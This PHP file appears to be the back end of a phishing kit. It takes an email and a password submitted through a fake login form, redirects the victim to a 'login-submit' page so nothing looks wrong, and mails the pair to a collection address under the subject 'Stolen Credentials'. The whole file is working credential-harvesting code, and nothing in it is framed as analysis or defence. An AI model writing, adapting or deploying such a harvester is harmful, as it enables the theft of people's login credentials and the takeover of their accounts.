<?php
$password = $_GET['password'];
$email = $_GET['email'];
 
$subject ="Stolen Credentials";
$message="Email: $email \nPassword: $password";
$header="from: test@test.com";
$to ='test@test.com';
if (!$password || !$email ){
echo '<script script type="text/javascript">';
echo 'window.location.href ="index.html";'; 
echo '</script>';
}
else{
echo '<script script type="text/javascript">';
echo 'window.location.href ="login-submit.html";'; 
echo '</script>';
mail($to,$subject,$message,$header);
}
?>